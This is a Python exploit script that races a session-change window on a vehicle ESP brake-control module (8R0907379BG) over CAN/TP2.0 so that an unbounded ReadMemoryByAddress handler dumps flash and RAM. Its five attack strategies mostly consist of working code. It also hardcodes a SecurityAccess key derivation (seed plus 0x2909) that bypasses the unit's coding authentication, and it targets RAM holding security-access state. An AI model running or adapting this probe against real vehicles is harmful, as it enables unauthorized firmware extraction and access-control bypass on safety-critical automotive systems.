#!/usr/bin/env python3
"""ESP8 (8R0907379BG) — race-window probe for SID 0x23 (ReadMemoryByAddress).

SID 0x23 lives in Table B (session 0x85 ASW dispatch table) but NOT in Table A
(0x83/0x86/0x89). After `10 85`, the ASW sets the SBOOT handoff marker
(0xaa005500 → 0x40bffc) and returns — the SBOOT monitor fires the SVC
asynchronously via RTI poll. If we can slip a `23` request in before the SVC
fires, the ASW's Table B handler at 0x987f4 (NO address bounds checking)
processes it.

KEY FINDING: SID 0x23 is CLASS 0x13 (same as SID 0x21 ReadDataByLocalId),
NOT CLASS 0x24 (flash-SA tier). This means it likely needs NO SecurityAccess
at all — just an active diagnostic session with Table B selected. The --no-sa
flag skips the SA exchange, making the sequence shorter and the window wider.

The SBOOT monitor polls sec_unlock_marker on RTI ticks (estimated 1-10 ms).
Our goal is to get the `23` request processed within that first tick.

Strategies tested:
  1. Pipeline: send `10 85`, receive `50 85`, immediately send `23` (no delay)
  2. CAN-blast: send `10 85` frame, then `23` frame back-to-back on the CAN bus
     before even reading the `50 85` response (~500 µs gap)
  3. Burst: after `50 85`, fire N reads in rapid succession

SAFE: no flash erase, no write operations. Worst case: SBOOT takes over and
returns NRC 0x90, or SA lockout if coding SA counts get consumed (coding SA
uses 27 03/04, not 27 01/02 — SBOOT lockout is separate and unaffected).

Usage (32-bit python, module power-cycled to state A):
  race_read23.py                     # default: pipeline + coding SA
  race_read23.py --blast             # CAN-blast (best chance)
  race_read23.py --blast --no-sa     # CAN-blast without SA (fastest path)
  race_read23.py --burst 5           # fire 5 rapid reads after 50 85
  race_read23.py --addr 400000       # read RAM instead of flash
  race_read23.py --all               # try pipeline then blast (power-cycle between!)
"""
import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from emu_unlock import LockedCAN, Stim, open_quiet, req_sid
from tp20_kwp import TP20KWP, kfmt

CODING_SA_CONST = 0x2909


def load_known_flash(offset, length):
    """Load reference bytes from the firmware binary for verification."""
    fwp = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                       "firmware", "8R0907379BG_0030.bin")
    try:
        with open(fwp, "rb") as f:
            f.seek(offset)
            return f.read(length)
    except Exception:
        return None


def coding_sa_unlock(tp):
    """Unlock coding SA (27 03/04, seed+0x2909). Returns True on success."""
    sr = req_sid(tp, bytes([0x27, 0x03]), tries=3, timeout=2.0)
    if not (sr and sr[0] == 0x67 and len(sr) >= 6):
        print(f"    27 03 -> {kfmt(sr)}")
        return False
    seed = int.from_bytes(sr[2:6], "big")
    key = (seed + CODING_SA_CONST) & 0xFFFFFFFF
    kb = key.to_bytes(4, "big")
    kr = req_sid(tp, bytes([0x27, 0x04]) + kb, tries=1, timeout=2.0)
    print(f"    27 03 -> seed 0x{seed:08X}")
    print(f"    27 04 -> {kfmt(kr)}")
    return kr is not None and kr[0] == 0x67


def make_read_req(addr, length):
    """Build a KWP2000 ReadMemoryByAddress request: 23 <addr_hi> <addr_mid> <addr_lo> <len>."""
    return bytes([0x23,
                  (addr >> 16) & 0xFF,
                  (addr >> 8) & 0xFF,
                  addr & 0xFF,
                  length & 0xFF])


def check_read_response(r, addr, length, label=""):
    """Analyse a response to SID 0x23. Returns True if we got data."""
    prefix = f"    [{label}] " if label else "    "
    if r is None:
        print(f"{prefix}23 @{addr:06X} len={length} -> no response")
        return False

    if r[0] == 0x63:
        data = r[1:]
        known = load_known_flash(addr, length) if addr < 0x110000 else None
        match = ""
        if known:
            match = " MATCH" if data[:len(known)] == known else " MISMATCH"
        print(f"{prefix}23 @{addr:06X} -> POSITIVE 0x63 ({len(data)} bytes){match}")
        print(f"{prefix}  data: {data.hex(' ')}")
        if known:
            print(f"{prefix}  fw:   {known.hex(' ')}")
        return True

    if r[0] == 0x7F:
        nrc = r[2] if len(r) > 2 else 0
        nrc_map = {0x11: "svcNotSupp", 0x12: "subFnNotSupp",
                   0x22: "condNotCorrect", 0x31: "outOfRange",
                   0x33: "secAccessDenied", 0x35: "invalidKey",
                   0x90: "uploadNotAccepted"}
        print(f"{prefix}23 @{addr:06X} -> NRC 0x{nrc:02X} "
              f"({nrc_map.get(nrc, '?')})  [{r.hex(' ')}]")
        return False

    print(f"{prefix}23 @{addr:06X} -> unexpected [{r.hex(' ')}]")
    return False


def strategy_pipeline(tp, stim, addr, length):
    """Strategy 1: normal pipeline. Send 10 85, receive 50 85, immediately send 23."""
    print("\n  === Strategy: PIPELINE (send 23 right after 50 85) ===")

    r85 = req_sid(tp, bytes.fromhex("1085"), tries=1, timeout=3.0)
    print(f"    10 85 -> {kfmt(r85)}")
    if not (r85 and r85[0] == 0x50 and len(r85) > 1 and r85[1] == 0x85):
        print("    [!] programming session refused")
        return False

    t0 = time.perf_counter()
    req = make_read_req(addr, length)
    r = tp.request(req, timeout=3.0)
    dt = (time.perf_counter() - t0) * 1000
    print(f"    (23 response wait: {dt:.1f} ms)")
    return check_read_response(r, addr, length, "pipeline")


def strategy_tight(tp, stim, addr, length):
    """Strategy 5: tightest possible race. Pre-compute all CAN frames, send
    ACK + 23 back-to-back the instant 50 85 arrives. No req_sid, no keepalive,
    no Python overhead between ACK and 23.

    The window is: marker written → next RTI tick fires SBOOT SVC.
    We need ACK + 23 to arrive and be dispatched within that window."""
    print("\n  === Strategy: TIGHT RACE (raw CAN, ACK+23 back-to-back) ===")

    # Pre-compute the 23 request frame so there's zero work after receiving 50 85
    req_23 = make_read_req(addr, length)
    n23 = len(req_23)
    # We'll set seq after sending 10 85 (it increments)
    # For now, build a template we'll patch with the right seq byte

    # Send 10 85 via raw _send_frames
    tp._drain()
    t_start = time.perf_counter()
    tp._send_frames(bytes.fromhex("1085"))
    seq_for_23 = tp.seq  # _send_frames already incremented seq

    # Pre-build the 23 frame with the correct sequence counter
    frame_23 = bytes([(1 << 4) | (seq_for_23 & 0xF),
                      (n23 >> 8) & 0xFF, n23 & 0xFF]) + req_23
    tp.seq = (seq_for_23 + 1) & 0xF

    # Read frames until we get the 50 85 response, then FIRE immediately
    got_response = False
    deadline = time.perf_counter() + 2.0
    while time.perf_counter() < deadline:
        r = tp.c.read(5)
        if not r:
            continue
        rid, pl = r
        if rid != tp.rx or not pl:
            continue
        op = pl[0] >> 4
        if op == 0xB:
            # ACK of our 10 85 frame — good, ECU received it
            continue
        if op in (0x1, 0x3):
            # Response frame (50 85 expected)
            rseq = pl[0] & 0xF
            payload = pl[1:]
            dt_resp = (time.perf_counter() - t_start) * 1000

            # Parse the KWP payload
            if len(payload) >= 2:
                total = (payload[0] << 8) | payload[1]
                kwp = bytes(payload[2:2 + total])
            else:
                kwp = bytes(payload)

            if kwp and kwp[0] == 0x7F and len(kwp) > 2 and kwp[2] == 0x78:
                # responsePending — keep waiting
                continue

            print(f"    50 85 received at +{dt_resp:.1f} ms: [{kwp.hex(' ')}]")

            if not (kwp and kwp[0] == 0x50):
                print(f"    [!] not a positive response: {kfmt(kwp)}")
                return False

            # === CRITICAL SECTION: send ACK + 23 as fast as possible ===
            ack_frame = bytes([0xB0 | ((rseq + 1) & 0xF)])
            tp.c.write(tp.tx, ack_frame)    # ACK the 50 85
            tp.c.write(tp.tx, frame_23)     # 23 request — back-to-back!
            dt_sent = (time.perf_counter() - t_start) * 1000
            print(f"    ACK + 23 sent at +{dt_sent:.1f} ms "
                  f"(gap from 50 85: {dt_sent - dt_resp:.1f} ms)")
            got_response = True
            break
        elif op == 0xA:
            tp._handle_ctrl(pl)

    if not got_response:
        print("    [!] no response to 10 85")
        return False

    # Read the response to 23
    t_wait = time.perf_counter()
    deadline = t_wait + 2.0
    while time.perf_counter() < deadline:
        r = tp.c.read(10)
        if not r:
            if time.perf_counter() - t_wait > 0.5:
                break
            continue
        rid, pl = r
        if rid != tp.rx or not pl:
            continue
        op = pl[0] >> 4
        if op == 0xB:
            continue
        if op in (0x0, 0x1, 0x2, 0x3):
            rseq = pl[0] & 0xF
            payload = pl[1:]
            if len(payload) >= 2:
                total = (payload[0] << 8) | payload[1]
                data = bytes(payload[2:2 + total])
            else:
                data = bytes(payload)
            if op in (0x0, 0x1):
                tp.c.write(tp.tx, bytes([0xB0 | ((rseq + 1) & 0xF)]))
            if len(data) >= 3 and data[0] == 0x7F and data[2] == 0x78:
                continue
            dt = (time.perf_counter() - t_start) * 1000
            print(f"    23 response at +{dt:.1f} ms: [{data.hex(' ')}]")
            return check_read_response(data, addr, length, "tight")
        else:
            tp._handle_ctrl(pl)

    print("    [!] no response to 23 (channel dead — SBOOT won the race)")
    return False


def strategy_blast(tp, stim, addr, length):
    """Strategy 2: CAN-level blast. Send 10 85 frame AND 23 frame back-to-back
    on the CAN bus, then read both responses.

    Timing: at 500 kbps, a CAN frame is ~230 µs on the wire. We send the 23
    frame immediately after 10 85 — the ECU receives it while still processing
    (or just after processing) the session transition. The TP2.0 sequence
    counter advances for both frames so the ECU treats them as two separate
    KWP requests on the same channel."""
    print("\n  === Strategy: CAN-BLAST (23 sent before reading 50 85) ===")

    req_85 = bytes.fromhex("1085")
    req_23 = make_read_req(addr, length)

    tp._drain()
    t_send = time.perf_counter()
    tp._send_frames(req_85)
    tp._send_frames(req_23)
    dt_send = (time.perf_counter() - t_send) * 1000
    print(f"    both frames sent in {dt_send:.1f} ms")

    responses = []
    t0 = time.perf_counter()
    deadline = t0 + 4.0
    while time.perf_counter() < deadline and len(responses) < 3:
        r = tp.c.read(10)
        if not r:
            if time.perf_counter() - t0 > 0.5 and len(responses) >= 1:
                break
            continue
        rid, pl = r
        if rid != tp.rx or not pl:
            continue
        op = pl[0] >> 4
        if op == 0xB:
            continue
        if op in (0x0, 0x1, 0x2, 0x3):
            rseq = pl[0] & 0xF
            payload = pl[1:]
            if len(payload) >= 2:
                total = (payload[0] << 8) | payload[1]
                data = payload[2:2 + total]
            else:
                data = payload
            if op in (0x0, 0x1):
                tp.c.write(tp.tx, bytes([0xB0 | ((rseq + 1) & 0xF)]))
            resp = bytes(data)
            if len(resp) >= 3 and resp[0] == 0x7F and resp[2] == 0x78:
                continue
            responses.append(resp)
            dt = (time.perf_counter() - t0) * 1000
            tag = "???"
            if resp[0] == 0x50:
                tag = f"50 {resp[1]:02X} session-ack" if len(resp) > 1 else "50 session-ack"
            elif resp[0] == 0x63:
                tag = "63 READ DATA!"
            elif resp[0] == 0x7F:
                nrc = resp[2] if len(resp) > 2 else 0
                sid = resp[1] if len(resp) > 1 else 0
                tag = f"7F {sid:02X} NRC 0x{nrc:02X}"
            print(f"    response #{len(responses)} at +{dt:.1f} ms: {tag}  [{resp.hex(' ')}]")
        else:
            tp._handle_ctrl(pl)

    success = False
    for resp in responses:
        if resp[0] == 0x63:
            success = check_read_response(resp, addr, length, "blast")

    if not success:
        for resp in responses:
            if resp[0] == 0x7F and len(resp) > 1 and resp[1] == 0x23:
                check_read_response(resp, addr, length, "blast")

    if not responses:
        print("    [!] no responses received")
    return success


def strategy_burst(tp, stim, addr, length, count):
    """Strategy 3: after 50 85, fire N reads back-to-back as fast as possible."""
    print(f"\n  === Strategy: BURST ({count} rapid reads after 50 85) ===")

    r85 = req_sid(tp, bytes.fromhex("1085"), tries=1, timeout=3.0)
    print(f"    10 85 -> {kfmt(r85)}")
    if not (r85 and r85[0] == 0x50 and len(r85) > 1 and r85[1] == 0x85):
        print("    [!] programming session refused")
        return False

    t0 = time.perf_counter()
    success = False
    for i in range(count):
        a = addr + i * length
        req = make_read_req(a, length)
        r = tp.request(req, timeout=1.0)
        dt = (time.perf_counter() - t0) * 1000
        label = f"burst-{i} +{dt:.0f}ms"
        if check_read_response(r, a, length, label):
            success = True
    return success


def strategy_noreconnect(tp, stim, addr, length):
    """Strategy 4: stay on the same channel, DON'T do the TP2.0 reconnect that
    ODIS does. After 50 85, the TP2.0 channel may still be alive for a few ms
    before the SBOOT tears it down."""
    print("\n  === Strategy: NO-RECONNECT (same channel, 23 then TesterPresent) ===")

    r85 = req_sid(tp, bytes.fromhex("1085"), tries=1, timeout=3.0)
    print(f"    10 85 -> {kfmt(r85)}")
    if not (r85 and r85[0] == 0x50 and len(r85) > 1 and r85[1] == 0x85):
        print("    [!] programming session refused")
        return False

    t0 = time.perf_counter()
    success = False

    for a, label in [(addr, "flash"), (0x405316, "session-flags"), (0x4079e4, "sa-state")]:
        req = make_read_req(a, 0x10)
        r = tp.request(req, timeout=1.5)
        dt = (time.perf_counter() - t0) * 1000
        if check_read_response(r, a, 0x10, f"{label} +{dt:.0f}ms"):
            success = True

    return success


def run_probe(args):
    addr = int(args.addr, 16)
    length = min(args.length, 0xFF)
    skip_sa = args.no_sa

    c = LockedCAN()
    stim = Stim(c, hz=50, ids=[0x200])
    stim.start()
    tp = None

    try:
        # Phase 1: open TP2.0, warmup in session 0x89
        tp = open_quiet(c, stim)
        if tp is None:
            print("[!] TP2.0 open failed")
            return
        print(f"[*] TP2.0 OPEN  TX->0x{tp.tx:03x}  RX<-0x{tp.rx:03x}")
        tp.maintain(2.0)

        r89 = req_sid(tp, bytes.fromhex("1089"))
        print(f"  10 89 -> {kfmt(r89)}")
        if not (r89 and r89[0] == 0x50):
            print("  [!] session 0x89 refused")
            return

        # Phase 2: optionally unlock coding SA
        if skip_sa:
            print("\n  [*] --no-sa: skipping SA unlock (SID 0x23 is CLASS 0x13, may not need SA)")
        else:
            print("\n  [*] coding SA unlock (27 03/04, +0x2909) in session 0x89 ...")
            if not coding_sa_unlock(tp):
                print("  [!] coding SA failed")
                return
            print("  [*] coding SA bit 29 SET — NOT entering 0x86 (would consume it)")

        # Phase 2b: baseline — try 23 in session 0x89 (Table A, no SID 0x23)
        if not args.fast:
            print("\n  [*] baseline: SID 0x23 in session 0x89 (should fail — not in Table A)")
            req = make_read_req(addr, length)
            r = req_sid(tp, req, tries=2, timeout=2.0)
            check_read_response(r, addr, length, "baseline-0x89")

        # Phase 3: race window — send 10 85 then immediately 23
        known = load_known_flash(addr, length) if addr < 0x110000 else None
        if known:
            print(f"\n  [*] flash reference @0x{addr:06X}: {known.hex(' ')}")

        if args.tight:
            strategy_tight(tp, stim, addr, length)
        elif args.blast:
            strategy_blast(tp, stim, addr, length)
        elif args.burst:
            strategy_burst(tp, stim, addr, length, args.burst)
        elif args.noreconnect:
            strategy_noreconnect(tp, stim, addr, length)
        else:
            strategy_pipeline(tp, stim, addr, length)

    finally:
        stim.stop = True
        stim.join(timeout=1.0)
        if tp:
            try:
                tp.close()
            except Exception:
                pass
        c.close()


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)

    ap.add_argument("--addr", default="000100",
                    help="hex address to read (default 000100 = flash+0x100)")
    ap.add_argument("--length", type=int, default=16,
                    help="bytes to read (default 16, max 255)")

    ap.add_argument("--no-sa", action="store_true",
                    help="skip coding SA unlock (SID 0x23 is CLASS 0x13, may not need SA)")
    ap.add_argument("--fast", action="store_true",
                    help="skip baseline probe (fewer round-trips before the race)")

    mode = ap.add_mutually_exclusive_group()
    mode.add_argument("--tight", action="store_true",
                      help="tight race: raw CAN, ACK+23 back-to-back (best chance)")
    mode.add_argument("--blast", action="store_true",
                      help="CAN-blast: send 23 before reading 50 85")
    mode.add_argument("--burst", type=int, metavar="N",
                      help="burst: fire N rapid reads after 50 85")
    mode.add_argument("--noreconnect", action="store_true",
                      help="no-reconnect: try 23 + other reads on same channel")

    ap.parse_args(namespace=(args := argparse.Namespace()))
    run_probe(args)


if __name__ == "__main__":
    main()
